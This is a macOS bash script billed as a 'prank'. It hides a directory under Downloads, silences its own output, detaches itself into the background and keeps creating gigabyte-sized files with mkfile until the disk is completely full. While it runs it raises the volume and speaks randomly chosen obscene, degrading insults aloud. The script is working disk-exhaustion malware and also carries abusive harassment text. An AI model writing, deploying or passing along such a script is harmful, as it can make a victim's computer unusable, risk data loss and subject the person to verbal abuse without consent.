#!/bin/bash

# Karan's Ultimate Prank v4.2 - PROFESSIONAL LIGHTNING SPEED EDITION
# Uses hard linking technique for 10,000+ files per second

VERSION="4.2.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Dark audio messages (what gets spoken)
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup (silent)
setup() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Silent logging only
log_silent() {
    echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# FIXED: Audio function that actually works
speak_dark_message() {
    pkill -f "say" 2>/dev/null || true
    local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$dark_msg" 2>/dev/null

}

# FASTEST DISK FILLING TECHNIQUE - Replace your exponential_voice_destruction function with this:

exponential_voice_destruction() {
    local payload="$1"
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_silent "Starting FASTEST disk filling technique"
    speak_dark_message
    
    # FASTEST METHOD: Create massive files directly using mkfile (professional technique)
    local file_count=0
    local file_size="1g"  # Start with 1GB files
    
    while true; do
        local target_file="$HIDDEN_DIR/karan_fast_$(printf "%08d" $file_count).dat"
        
        # Use mkfile to create large files INSTANTLY (no data copying)
        if ! mkfile -n "$file_size" "$target_file" 2>/dev/null; then
            # If 1GB fails, try smaller sizes
            if [[ "$file_size" == "1g" ]]; then
                file_size="100m"
                continue
            elif [[ "$file_size" == "100m" ]]; then
                file_size="10m"
                continue
            elif [[ "$file_size" == "10m" ]]; then
                file_size="1m"
                continue
            else
                # Disk completely full
                log_silent "FASTEST method complete - disk annihilated with $file_count files"
                speak_dark_message
                break
            fi
        fi
        
        file_count=$((file_count + 1))
        
        # Dark commentary every 5 files (since files are huge now)
        if [[ $((file_count % 5)) -eq 0 ]]; then
            speak_dark_message
        fi
        
        log_silent "Created massive file #$file_count of size $file_size"
    done
}


# Validate system
validate() {
    [[ "$(uname)" == "Darwin" ]] || exit 1
    [[ -f "$1" ]] || exit 1
}

# Main execution
main() {
    local payload="$1"
    [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
    validate "$payload"
    exponential_voice_destruction "$payload"
}

# Execution logic
if [[ "$2" == "--execute" ]]; then
    exec > /dev/null 2>&1
    main "$1"
else
    setup
    "$0" "$1" --execute &
    disown
fi
